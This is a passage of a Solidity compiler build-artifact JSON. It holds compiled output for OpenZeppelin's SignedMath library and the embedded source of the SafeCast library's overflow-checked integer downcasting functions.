boolean (false or true) to a uint256 (0 or 1) with no jump.\\n     */\\n    function toUint(bool b) internal pure returns (uint256 u) {\\n        assembly (\\\"memory-safe\\\") {\\n            u := iszero(iszero(b))\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0x195533c86d0ef72bcc06456a4f66a9b941f38eb403739b00f21fd7c1abd1ae54\",\"license\":\"MIT\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"@openzeppelin/contracts/utils/math/SignedMath.sol":{"SignedMath":{"abi":[],"devdoc":{"details":"Standard signed math utilities missing in the Solidity language.","kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"60566050600b82828239805160001a6073146043577f4e487b7100000000000000000000000000000000000000000000000000000000600052600060045260246000fd5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea2646970667358221220b4b67a772c606ff3a3d97f6aeebf9e09bde8285af6e75310d8f20f8aeaa6eef764736f6c634300081c0033","opcodes":"PUSH1 0x56 PUSH1 0x50 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x43 JUMPI PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x0 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xB4 0xB6 PUSH27 0x772C606FF3A3D97F6AEEBF9E09BDE8285AF6E75310D8F20F8AEAA6 0xEE 0xF7 PUSH5 0x736F6C6343 STOP ADDMOD SHR STOP CALLER ","sourceMap":"258:2354:8:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;"},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"73000000000000000000000000000000000000000030146080604052600080fdfea2646970667358221220b4b67a772c606ff3a3d97f6aeebf9e09bde8285af6e75310d8f20f8aeaa6eef764736f6c634300081c0033","opcodes":"PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xB4 0xB6 PUSH27 0x772C606FF3A3D97F6AEEBF9E09BDE8285AF6E75310D8F20F8AEAA6 0xEE 0xF7 PUSH5 0x736F6C6343 STOP ADDMOD SHR STOP CALLER ","sourceMap":"258:2354:8:-:0;;;;;;;;"},"gasEstimates":{"creation":{"codeDepositCost":"17200","executionCost":"97","totalCost":"17297"},"internal":{"abs(int256)":"infinite","average(int256,int256)":"infinite","max(int256,int256)":"infinite","min(int256,int256)":"infinite","ternary(bool,int256,int256)":"infinite"}},"methodIdentifiers":{}},"metadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Standard signed math utilities missing in the Solidity language.\",\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"@openzeppelin/contracts/utils/math/SignedMath.sol\":\"SignedMath\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"@openzeppelin/contracts/utils/math/SafeCast.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/math/SafeCast.sol)\\n// This file was procedurally generated from scripts/generate/templates/SafeCast.js.\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Wrappers over Solidity's uintXX/intXX/bool casting operators with added overflow\\n * checks.\\n *\\n * Downcasting from uint256/int256 in Solidity does not revert on overflow. This can\\n * easily result in undesired exploitation or bugs, since developers usually\\n * assume that overflows raise errors. `SafeCast` restores this intuition by\\n * reverting the transaction when such an operation overflows.\\n *\\n * Using this library instead of the unchecked operations eliminates an entire\\n * class of bugs, so it's recommended to use it always.\\n */\\nlibrary SafeCast {\\n    /**\\n     * @dev Value doesn't fit in an uint of `bits` size.\\n     */\\n    error SafeCastOverflowedUintDowncast(uint8 bits, uint256 value);\\n\\n    /**\\n     * @dev An int value doesn't fit in an uint of `bits` size.\\n     */\\n    error SafeCastOverflowedIntToUint(int256 value);\\n\\n    /**\\n     * @dev Value doesn't fit in an int of `bits` size.\\n     */\\n    error SafeCastOverflowedIntDowncast(uint8 bits, int256 value);\\n\\n    /**\\n     * @dev An uint value doesn't fit in an int of `bits` size.\\n     */\\n    error SafeCastOverflowedUintToInt(uint256 value);\\n\\n    /**\\n     * @dev Returns the downcasted uint248 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint248).\\n     *\\n     * Counterpart to Solidity's `uint248` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 248 bits\\n     */\\n    function toUint248(uint256 value) internal pure returns (uint248) {\\n        if (value > type(uint248).max) {\\n            revert SafeCastOverflowedUintDowncast(248, value);\\n        }\\n        return uint248(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint240 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint240).\\n     *\\n     * Counterpart to Solidity's `uint240` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 240 bits\\n     */\\n    function toUint240(uint256 value) internal pure returns (uint240) {\\n        if (value > type(uint240).max) {\\n            revert SafeCastOverflowedUintDowncast(240, value);\\n        }\\n        return uint240(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint232 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint232).\\n     *\\n     * Counterpart to Solidity's `uint232` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 232 bits\\n     */\\n    function toUint232(uint256 value) internal pure returns (uint232) {\\n        if (value > type(uint232).max) {\\n            revert SafeCastOverflowedUintDowncast(232, value);\\n        }\\n        return uint232(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint224 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint224).\\n     *\\n     * Counterpart to Solidity's `uint224` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 224 bits\\n     */\\n    function toUint224(uint256 value) internal pure returns (uint224) {\\n        if (value > type(uint224).max) {\\n            revert SafeCastOverflowedUintDowncast(224, value);\\n        }\\n        return uint224(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint216 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint216).\\n     *\\n     * Counterpart to Solidity's `uint216` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 216 bits\\n     */\\n    function toUint216(uint256 value) internal pure returns (uint216) {\\n        if (value > type(uint216).max) {\\n            revert SafeCastOverflowedUintDowncast(216, value);\\n        }\\n        return uint216(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint208 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint208).\\n     *\\n     * Counterpart to Solidity's `uint208` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 208 bits\\n     */\\n    function toUint208(uint256 value) internal pure returns (uint208) {\\n        if (value > type(uint208).max) {\\n            revert SafeCastOverflowedUintDowncast(208, value);\\n        }\\n        return uint208(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint200 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint200).\\n     *\\n     * Counterpart to Solidity's `uint200` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 200 bits\\n     */\\n    function toUint200(uint256 value) internal pure returns (uint200) {\\n        if (value > type(uint200).max) {\\n            revert SafeCastOverflowedUintDowncast(200, value);\\n        }\\n        return uint200(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint192 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint192).\\n     *\\n     * Counterpart to Solidity's `uint192` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 192 bits\\n     */\\n    function toUint192(uint256 value) internal pure returns (uint192) {\\n        if (value > type(uint192).max) {\\n            revert SafeCastOverflowedUintDowncast(192, value);\\n        }\\n        return uint192(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint184 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint184).\\n     *\\n     * Counterpart to Solidity's `uint184` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 184 bits\\n     */\\n    function toUint184(uint256 value) internal pure returns (uint184) {\\n        if (value > type(uint184).max) {\\n            revert SafeCastOverflowedUintDowncast(184, value);\\n        }\\n        return uint184(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint176 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint176).\\n     *\\n     * Counterpart to Solidity's `uint176` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 176 bits\\n     */\\n    function toUint176(uint256 value) internal pure returns (uint176) {\\n        if (value > type(uint176).max) {\\n            revert SafeCastOverflowedUintDowncast(176, value);\\n        }\\n        return uint176(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint168 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint168).\\n     *\\n     * Counterpart to Solidity's `uint168` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 168 bits\\n     */\\n    function toUint168(uint256 value) internal pure returns (uint168) {\\n        if (value > type(uint168).max) {\\n            revert SafeCastOverflowedUintDowncast(168, value);\\n        }\\n        return uint168(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint160 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint160).\\n     *\\n     * Counterpart to Solidity's `uint160` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 160 bits\\n     */\\n    function toUint160(uint256 value) internal pure returns (uint160) {\\n        if (value > type(uint160).max) {\\n            revert SafeCastOverflowedUintDowncast(160, value);\\n        }\\n        return uint160(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint152 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint152).\\n     *\\n     * Counterpart to Solidity's `uint152` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 152 bits\\n     */\\n    function toUint152(uint256 value) internal pure returns (uint152) {\\n        if (value > type(uint152).max) {\\n            revert SafeCastOverflowedUintDowncast(152, value);\\n        }\\n        return uint152(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint144 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint144).\\n     *\\n     * Counterpart to Solidity's `uint144` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 144 bits\\n     */\\n    function toUint144(uint256 value) internal pure returns (uint144) {\\n        if (value > type(uint144).max) {\\n            revert SafeCastOverflowedUintDowncast(144, value);\\n        }\\n        return uint144(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint136 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint136).\\n     *\\n     * Counterpart to Solidity's `uint136` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 136 bits\\n     */\\n    function toUint136(uint256 value) internal pure returns (uint136) {\\n        if (value > type(uint136).max) {\\n            revert SafeCastOverflowedUintDowncast(136, value);\\n        }\\n        return uint136(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint128 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint128).\\n     *\\n     * Counterpart to Solidity's `uint128` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 128 bits\\n     */\\n    function toUint128(uint256 value) internal pure returns (uint128) {\\n        if (value > type(uint128).max) {\\n            revert SafeCastOverflowedUintDowncast(128, value);\\n        }\\n        return uint128(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint120 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint120).\\n     *\\n     * Counterpart to Solidity's `uint120` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 120 bits\\n     */\\n    function toUint120(uint256 value) internal pure returns (uint120) {\\n        if (value > type(uint120).max) {\\n            revert SafeCastOverflowedUintDowncast(120, value);\\n        }\\n        return uint120(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint112 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint112).\\n     *\\n     * Counterpart to Solidity's `uint112` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 112 bits\\n     */\\n    function toUint112(uint256 value) internal pure returns (uint112) {\\n        if (value > type(uint112).max) {\\n            revert SafeCastOverflowedUintDowncast(112, value);\\n        }\\n        return uint112(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint104 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint104).\\n     *\\n     * Counterpart to Solidity's `uint104` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 104 bits\\n     */\\n    function toUint104(uint256 value) internal pure returns (uint104) {\\n        if (value > type(uint104).max) {\\n            revert SafeCastOverflowedUintDowncast(104, value);\\n        }\\n        return uint104(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint96 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint96).\\n     *\\n     * Counterpart to Solidity's `uint96` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 96 bits\\n     */\\n    function toUint96(uint256 value) internal pure returns (uint96) {\\n        if (value > type(uint96).max) {\\n            revert SafeCastOverflowedUintDowncast(96, value);\\n        }\\n        return uint96(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint88 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint88).\\n     *\\n     * Counterpart to Solidity's `uint88` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 88 bits\\n     */\\n    function toUint88(uint256 value) internal pure returns (uint88) {\\n        if (value > type(uint88).max) {\\n            revert SafeCastOverflowedUintDowncast(88, value);\\n        }\\n        return uint88(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint80 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint80).\\n     *\\n     * Counterpart to Solidity's `uint80` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 80 bits\\n     */\\n    function toUint80(uint256 value) internal pure returns (uint80) {\\n        if (value > type(uint80).max) {\\n            revert SafeCastOverflowedUintDowncast(80, value);\\n        }\\n        return uint80(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint72 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint72).\\n     *\\n     * Counterpart to Solidity's `uint72` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 72 bits\\n     */\\n    function toUint72(uint256 value) internal pure returns (uint72) {\\n        if (value > type(uint72).max) {\\n            revert SafeCastOverflowedUintDowncast(72, value);\\n        }\\n        return uint72(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint64 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint64).\\n     *\\n     * Counterpart to Solidity's `uint64` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 64 bits\\n     */\\n    function toUint64(uint256 value) internal pure returns (uint64) {\\n        if (value > type(uint64).max) {\\n            revert SafeCastOverflowedUintDowncast(64, value);\\n        }\\n        return uint64(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint56 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint56).\\n     *\\n     * Counterpart to Solidity's `uint56` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 56 bits\\n     */\\n    function toUint56(uint256 value) internal pure returns (uint56) {\\n        if (value > type(uint56).max) {\\n            revert SafeCastOverflowedUintDowncast(56, value);\\n        }\\n        return uint56(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint48 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint48).\\n     *\\n     * Counterpart to Solidity's `uint48` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 48 bits\\n     */\\n    function toUint48(uint256 value) internal pure returns (uint48) {\\n        if (value > type(uint48).max) {\\n            revert SafeCastOverflowedUintDowncast(48, value);\\n        }\\n        return uint48(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint40 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint40).\\n     *\\n     * Counterpart to Solidity's `uint40` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 40 bits\\n     */\\n    function toUint40(uint256 value) internal pure returns (uint40) {\\n        if (value > type(uint40).max) {\\n            revert SafeCastOverflowedUintDowncast(40, value);\\n        }\\n        return uint40(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint32 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint32).\\n     *\\n     * Counterpart to Solidity's `uint32` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 32 bits\\n     */\\n    function toUint32(uint256 value) internal pure returns (uint32) {\\n        if (value > type(uint32).max) {\\n            revert SafeCastOverflowedUintDowncast(32, value);\\n        }\\n        return uint32(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint24 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint24).\\n     *\\n     * Counterpart to Solidity's `uint24` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 24 bits\\n     */\\n    function toUint24(uint256 value) internal pure returns (uint24) {\\n        if (value > type(uint24).max) {\\n            revert SafeCastOverflowedUintDowncast(24, value);\\n        }\\n        return uint24(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint16 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint16).\\n     *\\n     * Counterpart to Solidity's `uint16` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 16 bits\\n     */\\n    function toUint16(uint256 value) internal pure returns (uint16) {\\n        if (value > type(uint16).max) {\\n            revert SafeCastOverflowedUintDowncast(16, value);\\n        }\\n        return uint16(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint8 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint8).\\n     *\\n     * Counterpart to Solidity's `uint8` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 8 bits\\n     */\\n    function toUint8(uint256 value) internal pure returns (uint8) {\\n        if (value > type(uint8).max) {\\n            revert SafeCastOverflowedUintDowncast(8, value);\\n        }\\n        return uint8(value);\\n    }\\n\\n    /**\\n     * @dev Converts a signed int256 into an unsigned uint256.\\n     *\\n     * Requirements:\\n     *\\n     * - input must be greater than or equal to 0.\\n     */\\n    function toUint256(int256 value) internal pure returns (uint256) {\\n        if (value < 0) {\\n            revert SafeCastOverflowedIntToUint(value);\\n        }\\n        return uint256(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int248 from int256, reverting on\\n     * overflow (when the input is less than smallest int248 or\\n     * greater than largest int248).\\n     *\\n     * Counterpart to Solidity's `int248` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 248 bits\\n     */\\n    function toInt248(int256 value) internal pure returns (int248 downcasted) {\\n        downcasted = int248(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(248, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int240 from int256, reverting on\\n     * overflow (when the input is less than smallest int240 or\\n     * greater than largest int240).\\n     *\\n     * Counterpart to Solidity's `int240` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 240 bits\\n     */\\n    function toInt240(int256 value) internal pure returns (int240 downcasted) {\\n        downcasted = int240(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(240, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int232 from int256, reverting on\\n     * overflow (when the input is less than smallest int232 or\\n     * greater than largest int232).\\n     *\\n     * Counterpart to Solidity's `int232` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 232 bits\\n     */\\n    function toInt232(int256 value) internal pure returns (int232 downcasted) {\\n        downcasted = int232(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(232, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int224 from int256, reverting on\\n     * overflow (when the input is less than smallest int224 or\\n     * greater than largest int224).\\n     *\\n     * Counterpart to Solidity's `int224` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 224 bits\\n     */\\n    function toInt224(int256 value) internal pure returns (int224 downcasted) {\\n        downcasted = int224(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(224, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int216 from int256, reverting on\\n     * overflow (when the input is less than smallest int216 or\\n     * greater than largest int216).\\n     *\\n     * Counterpart to Solidity's `int216` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 216 bits\\n     */\\n    function toInt216(int256 value) internal pure returns (int216 downcasted) {\\n        downcasted = int216(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(216, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int208 from int256, reverting on\\n     * overflow (when the input is less than smallest int208 or\\n     * greater than largest int208).\\n     *\\n     * Counterpart to Solidity's `int208` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 208 bits\\n     */\\n    function toInt208(int256 value) internal pure returns (int208 downcasted) {\\n        downcasted = int208(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(208, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int200 from int256, reverting on\\n     * overflow (when the input is less than smallest int200 or\\n     * greater than largest int200).\\n     *\\n     * Counterpart to Solidity's `int200` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 200 bits\\n     */\\n    function toInt200(int256 value) internal pure returns (int200 downcasted) {\\n        downcasted = int200(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(200, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int192 from int256, reverting on\\n     * overflow (when the input is less than smallest int192 or\\n     * greater than largest int192).\\n     *\\n     * Counterpart to Solidity's `int192` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 192 bits\\n     */\\n    function toInt192(int256 value) internal pure returns (int192 downcasted) {\\n        downcasted = int192(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(192, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int184 from int256, reverting on\\n     * overflow (when the input is less than smallest int184 or\\n     * greater than largest int184).\\n     *\\n     * Counterpart to Solidity's `int184` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 184 bits\\n     */\\n    function toInt184(int256 value) internal pure returns (int184 downcasted) {\\n        downcasted = int184(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(184, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int176 from int256, reverting on\\n     * overflow (when the input is less than smallest int176 or\\n     * greater than largest int176).\\n     *\\n     * Counterpart to Solidity's `int176` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 176 bits\\n     */\\n    function toInt176(int256 value) internal pure returns (int176 downcasted) {\\n        downcasted = int176(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(176, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int168 from int256, reverting on\\n     * overflow (when the input is less than smallest int168 or\\n     * greater than largest int168).\\n     *\\n     * Counterpart to Solidity's `int168` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 168 bits\\n     */\\n    function toInt168(int256 value) internal pure returns (int168 downcasted) {\\n        downcasted = int168(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(168, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int160 from int256, reverting on\\n     * overflow (when the input is less than smallest int160 or\\n     * greater than largest int160).\\n     *\\n     * Counterpart to Solidity's `int160` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 160 bits\\n     */\\n    function toInt160(int256 value) internal pure returns (int160 downcasted) {\\n        downcasted = int160(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(160, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int152 from int256, reverting on\\n     * overflow (when the input is less than smallest int152 or\\n     * greater than largest int152).\\n     *\\n     * Counterpart to Solidity's `int152` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 152 bits\\n     */\\n    function toInt152(int256 value) internal pure returns (int152 downcasted) {\\n        downcasted = int152(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(152, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int144 from int256, reverting on\\n     * overflow (when the input is less than smallest int144 or\\n     * greater than largest int144).\\n     *\\n     * Counterpart to Solidity's `int144` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 144 bits\\n     */\\n    function toInt144(int256 value) internal pure returns (int144 downcasted) {\\n        downcasted = int144(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(144, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int136 from int256, reverting on\\n     * overflow (when the input is less than smallest int136 or\\n     * greater than largest int136).\\n     *\\n     * Counterpart to Solidity's `int136` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 136 bits\\n     */\\n    function toInt136(int256 value) internal pure returns (int136 downcasted) {\\n        downcasted = int136(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(136, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int128 from int256, reverting on\\n     * overflow (when the input is less than smallest int128 or\\n     * greater than largest int128).\\n     *\\n     * Counterpart to Solidity's `int128` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 128 bits\\n     */\\n    function toInt128(int256 value) internal pure returns (int128 downcasted) {\\n        downcasted = int128(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(128, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int120 from int256, reverting on\\n     * overflow (when the input is less than smallest int120 or\\n     * greater than largest int120).\\n     *\\n     * Counterpart to Solidity's `int120` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 120 bits\\n     */\\n    function toInt120(int256 value) internal pure returns (int120 downcasted) {\\n        downcasted = int120(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(120, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int112 from int256, reverting on\\n     * overflow (when the input is less than smallest int112 or\\n     * greater than largest int112).\\n     *\\n     * Counterpart to Solidity's `int112` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 112 bits\\n     */\\n    function toInt112(int256 value) internal pure returns (int112 downcasted) {\\n        downcasted = int112(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(112, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int104 from int256, reverting on\\n     * overflow (when the input is less than smallest int104 or\\n     * greater than largest int104).\\n     *\\n     * Counterpart to Solidity's `int104` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 104 bits\\n     */\\n    function toInt104(int256 value) internal pure returns (int104 downcasted) {\\n        downcasted = int104(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(104, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int96 from int256, reverting on\\n     * overflow (when the input is less than smallest int96 or\\n     * greater than largest int96).\\n     *\\n     * Counterpart to Solidity's `int96` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 96 bits\\n     */\\n    function toInt96(int256 value) internal pure returns (int96 downcasted) {\\n        downcasted = int96(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(96, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int88 from int256, reverting on\\n     * overflow (when the input is less than smallest int88 or\\n     * greater than largest int88).\\n     *\\n     * Counterpart to Solidity's `int88` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 88 bits\\n     */\\n    function toInt88(int256 value) internal pure returns (int88 downcasted) {\\n        downcasted = int88(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(88, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int80 from int256, reverting on\\n     * overflow (when the input is less than smallest int80 or\\n     * greater than largest int80).\\n     *\\n     * Counterpart to Solidity's `int80` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 80 bits\\n     */\\n    function toInt80(int256 value) internal pure returns (int80 downcasted) {\\n        downcasted = int80(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(80, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int72 from int256, reverting on\\n     * overflow (when the input is less than smallest int72 or\\n     * greater than largest int72).\\n     *\\n     * Counterpart to Solidity's `int72` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 72 bits\\n     */\\n    function toInt72(int256 value) internal pure returns 